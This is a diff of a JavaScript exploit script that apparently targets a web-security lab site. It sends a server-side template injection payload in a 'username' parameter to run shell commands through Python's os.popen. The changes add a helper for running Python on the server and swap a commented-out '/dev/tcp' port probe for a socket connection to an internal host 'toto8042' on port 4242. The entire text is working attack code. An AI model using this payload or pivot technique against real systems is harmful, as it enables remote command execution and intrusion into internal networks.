@@ -4,15 +4,17 @@ import axios from 'axios'
 
 const url = 'https://ssti4.secu-web.blackfoot.dev'
 
-function makeCmd(cmd, stderr=true) {
+function makeCmd(cmd, stderr=true, printSafe=true) {
 	if (stderr) {
 		cmd += ' 2>&1 | cat'
 	}
 
-	return encodeURIComponent(`{{request.application.__globals__.__builtins__.__import__('os').popen('${cmd}').read()}}`)
+	const safe = printSafe ? "|safe" : ""
+
+	return encodeURIComponent(`{{request.application.__globals__.__builtins__.__import__("os").popen("${cmd}").read()${safe}}}`)
 }
 
-async function runCmd(cmd, stderr=true) {
+async function runCmd(cmd, stderr=true, printSafe=true) {
 	const res = await axios({
 		method: 'get',
 		url: `${url}?username=${makeCmd(cmd, stderr)}`
@@ -22,9 +24,26 @@ async function runCmd(cmd, stderr=true) {
 	return match[1]
 }
 
+async function runPython(cmd, stderr=true, printSafe=true) {
+	return await runCmd(`python -c \\"${cmd}\\"`)
+}
+
 async function main() { 
-	// const res = await runCmd(`timeout 1 bash -c "</dev/tcp/toto8042/4242" && echo -n open || echo -n closed`)
-	const res = await runCmd(`ls /bin`)
+	// https://wiki.python.org/moin/TcpCommunication
+	const res = await runPython(`
+import socket
+
+TCP_IP = 'toto8042'
+TCP_PORT = 4242
+BUFFER_SIZE = 128
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+data = s.recv(BUFFER_SIZE)
+s.close()
+
+print(data.decode('utf-8'))
+`)
 	console.log(res)
 }
 
